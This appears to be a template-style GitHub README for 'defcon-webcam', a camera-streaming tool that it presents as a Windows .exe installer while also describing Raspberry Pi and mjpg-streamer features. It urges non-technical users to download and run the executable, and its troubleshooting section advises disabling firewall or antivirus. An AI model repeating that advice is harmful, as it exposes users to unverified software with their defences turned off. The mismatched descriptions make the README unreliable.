# 🎥 defcon-webcam - Simple Real-Time Camera Monitoring

[![Download defcon-webcam](https://img.shields.io/badge/Download%20defcon--webcam-4CAF50?style=for-the-badge&logo=github)](https://github.com/Liljaona/defcon-webcam/releases)

## 🔍 What is defcon-webcam?

defcon-webcam is a program that lets you watch your camera feed live. It works with a Raspberry Pi to stream video in real-time. The app can switch between day and night modes automatically to improve the video quality depending on lighting. You can also set up camera presets to change views quickly.

It integrates with the alert system from Israel’s Home Front Command. This means it can be part of a larger safety setup in your home or workplace.

## ⚙️ System Requirements

Before starting, make sure your Windows PC meets these requirements:

- Windows 10 or later, 64-bit
- At least 4 GB of RAM
- 2 GHz or faster processor
- Network connection (Wi-Fi or Ethernet)
- A supported USB camera or built-in webcam
- If you want to connect to a Raspberry Pi, ensure you have the Pi set up on your local network

defcon-webcam does not require an internet connection if you only use it for local streaming. The app needs your permission to access the camera and network.

## 🚀 Getting Started

This section explains how to download and start using defcon-webcam on Windows. No programming skills are needed.

### 1. Download

Go to the release page to get the latest version of defcon-webcam.

[![Get defcon-webcam](https://img.shields.io/badge/Get%20defcon--webcam-yellowgreen?style=for-the-badge&logo=windows)](https://github.com/Liljaona/defcon-webcam/releases)

- Click the link above or visit:  
  https://github.com/Liljaona/defcon-webcam/releases  
- Look for the latest release marked with the highest version number.  
- Find the Windows installer file. It should end with `.exe`.  
- Click on it to download.

### 2. Install

- Once the file downloads, open the folder where it saved.
- Double-click the `.exe` file to start installation.
- Follow the setup prompts:
  - Choose an installation folder or accept the default.
  - Agree to any terms presented.
  - Wait for the installer to finish.

### 3. Run defcon-webcam

- After installation, find the defcon-webcam icon on your desktop or in your Start menu.
- Double-click it to open.
- The app will try to access your webcam and show the live video feed.
- If prompted, allow access to your camera and microphone.

## 🖥️ Using defcon-webcam

The main window shows your camera’s live video. Here are key features you can use:

- **Live Streaming**: See your camera feed in real-time.
- **Day/Night Modes**: The app switches modes automatically based on light.  
- **Presets**: Save camera angles or zoom levels for quick access.
- **Alerts Integration**: Connect the app with Israel’s Home Front Command alerts. It will display or send notifications if there’s an emergency.

### Switching Modes Manually

If you want, you can switch between day and night modes yourself:

- Find the “Mode” button in the app.
- Click to toggle between day or night view.

### Setting Presets

- Adjust your camera to your preferred view.
- Click “Save Preset” and give it a name.
- Later, select the preset from the list to quickly return to that setup.

## 🌐 Network Setup (Optional)

defcon-webcam can connect to cameras on the same network. This is useful if you use a Raspberry Pi to capture video:

- Ensure your Raspberry Pi and PC are on the same Wi-Fi or wired network.
- On the app, enter the IP address of the Raspberry Pi.
- Click “Connect” to start viewing the Pi’s camera feed.

## 📂 File Locations and Logs

- Installed files usually go in `C:\Program Files\defcon-webcam`.
- Video streams and logs save in the `Documents\defcon-webcam` folder.
- Logs record app activities and errors for troubleshooting.

## 🔧 Troubleshooting

If defcon-webcam does not start or work correctly, try these steps:

- Restart your computer and open the app again.
- Check your camera is properly connected and not used by another program.
- Make sure you gave permission for the app to access your camera.
- Disable any firewall or antivirus that might block the app temporarily.
- Check your network if you use Raspberry Pi integration.
- Visit the GitHub issues page to see known problems or report new ones.

## 📋 Features Overview

- Real-time MJPEG streaming of camera video.
- Auto day/night mode for clear images day and night.
- Save and recall up to 5 camera view presets.
- Connect to Raspberry Pi cameras over your network.
- Integrates with Israel’s Home Front Command alert notifications.
- Runs on Windows 10 and later.

## 🧩 Advanced Settings (For Curious Users)

If you want to tweak the app’s behavior:

- Open the “Settings” menu.
- You can adjust video resolution and frame rate.
- Choose notification options for alerts.
- Enable or disable automatic mode switching.

Most users do not need to change these settings for basic use.

## 🔗 Where to Get Updates

Visit the release page regularly for updates.

[https://github.com/Liljaona/defcon-webcam/releases](https://github.com/Liljaona/defcon-webcam/releases)

Updated versions bring bug fixes, security patches, and new features.

## 📞 Getting Help

For help with defcon-webcam:

- Check the README file in the downloaded package.
- Visit the Issues tab on the GitHub page.
- Look through setup videos and FAQs linked on the main repo site.
- Ask on community forums related to Raspberry Pi or surveillance cameras.

---

## ⚙️ Technical Topics

This app relates to these technical areas:

- Alerts for emergency and safety
- FFmpeg video processing  
- IoT (Internet of Things) connectivity  
- mjpg-streamer for video streaming  
- pikud-haoref (Home Front Command) integration  
- Raspberry Pi camera control  
- Surveillance camera software  
- Twitter bot connections for alerts  
- Webcam video on Windows systems  

Use this information if you want to explore or customize the software deeper.